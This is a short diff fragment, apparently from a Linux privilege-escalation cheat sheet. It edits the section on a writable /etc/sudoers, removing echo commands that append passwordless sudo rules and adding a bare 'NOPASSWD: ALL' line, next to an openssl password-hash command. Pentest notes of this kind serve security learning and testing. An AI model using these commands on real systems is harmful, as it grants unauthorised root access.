@@ -815,8 +815,7 @@ openssl passwd -1 -salt hack password123
  ```
 ### Writable /etc/sudoers
 ```
-echo "$username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
-echo "$username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+$username ALL=(ALL) NOPASSWD: ALL
 $username ALL=(ALL:ALL) ALL
 ```
 Allow members of group sudo to execute any command
